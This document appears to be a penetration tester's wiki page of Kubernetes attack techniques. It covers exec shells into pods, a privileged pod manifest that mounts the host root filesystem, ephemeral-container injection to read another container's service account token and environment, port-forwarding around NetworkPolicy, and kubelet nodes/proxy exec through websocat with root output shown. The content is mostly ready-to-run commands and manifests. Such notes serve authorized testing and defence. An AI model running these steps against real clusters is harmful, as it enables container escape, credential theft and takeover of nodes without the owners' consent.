
```bash
kubectl delete pod nginx
```
# Execute Commands in Target Pod

```bash
# Interactive terminal session
kubectl exec -it <pod-name> -n <namespace> -- /bin/bash
kubectl exec -it <pod-name> -n <namespace> -- /bin/sh

# Exec into a specific container
kubectl exec -it <pod-name> -n <namespace> -c <container-name> -- /bin/bash

# Run a single command
kubectl exec <pod-name> -n <namespace> -- env
kubectl exec <pod-name> -n <namespace> -- cat /etc/passwd
```

# Create Pod
Be aware of you target namespace's [[Pod Security Admission (PSA)]] policy, which will determine whether privileged pods can be deployed
## Pod permissions of interest

| Setting                                          | Grants access to                  |
| ------------------------------------------------ | --------------------------------- |
| hostNetwork: true                                | Host network stack                |
| hostPID: true                                    | Host process table                |
| hostIPC: true                                    | Host shared memory                |
| privileged: true                                 | Full host root access             |
| runAsUser: 0                                     | root UID 0 (in container)         |
| allowPrivilegeEscalation: true                   | setuid / privilege escalation     |
| capabilities.add                                 | kernel capabilities               |
| hostPath volumes                                 | host filesystem                   |
| seLinuxOptions  <br>seccompProfile  <br>AppArmor | Kernel-level confinement controls |
## Commands
```bash
# Simple pod creation
kubectl run -it myshell --image=busybox -n <namespace>

# Simple deployment
kubectl create deployment test1 —image=busybox -n <namespace>
```


## Privileged pod manifest
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: noderootpod
  labels:
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: noderootpod
    image: busybox
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

apply
```bash
kubectl apply -f ./privileged-pod.yml
```

# Create Ephemeral Container in Target Pod
If you have `PATCH` to the `pods/ephemeralcontainers` subresource, you can create a container in a target pod, attach to that new container, and access the file system (including the mounted service token) of another container on that pod. 

Locate a pod of interest, based on the [[Kube API Reconnaissance (kubectl)#List Containers Running in a Pod|containers therein]] or the [[Kube API Reconnaissance (kubectl)#List Pods and Their Service Accounts|service accounts being used]], then run the following to create an ephemeral container on it and attach to it:
```bash
# Drop a shell into an existing pod using a different image
kubectl debug -it <target_pod> -n <namespace> \
  --image=ubuntu:22.04 \
  --container=debug-shell \
  -- bash

# Target a specific container's PID namespace (see its processes)
kubectl debug -it <target_pod> -n <namespace> \
  --image=ubuntu:22.04 \
  --target=<container-name> \
  -- bash
```

Another way to do this without the debug command:
```bash
# 1. Get current ephemeralContainers spec (may be empty)
kubectl get pod <target_pod> -n <namespace> \
  -o jsonpath='{.spec.ephemeralContainers}' | jq

# 2. PATCH in a new one
kubectl patch pod <target_pod> -n <namespace> \
  --subresource=ephemeralcontainers \
  --type=strategic-merge-patch \
  -p '{
    "spec": {
      "ephemeralContainers": [{
        "name": "debug",
        "image": "ubuntu:22.04",
        "stdin": true,
        "tty": true,
        "command": ["/bin/bash"]
      }]
    }
  }'

# 3. Attach
kubectl attach <target_pod> -c debug -it -n <ns>
```

Once inside:
```bash
# Inside the ephemeral container:
# target container's rootfs
ls /proc/1/root/

# target container's service token                
cat /proc/1/root/var/run/secrets/kubernetes.io/serviceaccount/token

# target container's env vars
cat /proc/1/environ | tr '\0' '\n'

# target container's config files         
find /proc/1/root/etc -name "*.conf" 2>/dev/null
```

By default an ephemeral container shares the pod’s network and IPC namespaces even without `--target`
```bash
# Network namespace: you're inside the pod's network
curl http://localhost:<port>        # hit sidecar services
ss -tlnp                            # see all listening sockets
```

This could also be used to escalate to node access if the namespace's [[Pod Security Admission (PSA)]] policy allow it:
```bash
kubectl patch pod <target_pod> -n <namespace> \
  --subresource=ephemeralcontainers \
  --type=strategic-merge-patch \
  -p '{
    "spec": {
      "ephemeralContainers": [{
        "name": "pwn",
        "image": "ubuntu:22.04",
        "command": ["/bin/bash"],
        "stdin": true,
        "tty": true,
        "securityContext": {
          "privileged": true
        }
      }]
    }
  }'
```

# Port Forward
The `pods/portforward` permission lets you tunnel TCP connections from your local machine into a pod’s network namespace, effectively bypassing NetworkPolicy, as `portforward` goes through the API server, not the pod network directly.

```bash
# Forward local port 8080 to pod port 80
kubectl port-forward pod/<pod> 8080:80 -n <ns>

# Forward to a deployment/service (kubectl picks a backing pod)
kubectl port-forward deployment/<deploy> 8080:80 -n <ns>
kubectl port-forward svc/<svc> 8080:80 -n <ns>

# Multiple ports
kubectl port-forward pod/<pod> 8080:80 9090:9090 -n <ns>

# Bind to all interfaces
kubectl port-forward pod/<pod> --address 0.0.0.0 8080:80 -n <ns>
```

# Exploiting nodes/proxy

See: [Graham Helton's research](https://grahamhelton.com/blog/nodes-proxy-rce)
If you have `GET` to the `nodes/proxy` subresource, you can execute on a target node's pods if you have network access to its TCP port 10250.

Use `websocat` to send a WebSocket request directly to the Kubelet’s `/exec` endpoint:
```bash
websocat \
  --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol "v4.channel.k8s.io" \
  "wss://$NODE_IP:10250/exec/default/nginx/nginx?output=1&error=1&command=id"

uid=0(root) gid=0(root) groups=0(root)
```

Now you can [[Pod Reconnaissance|Enumerate you newly accessible pod]]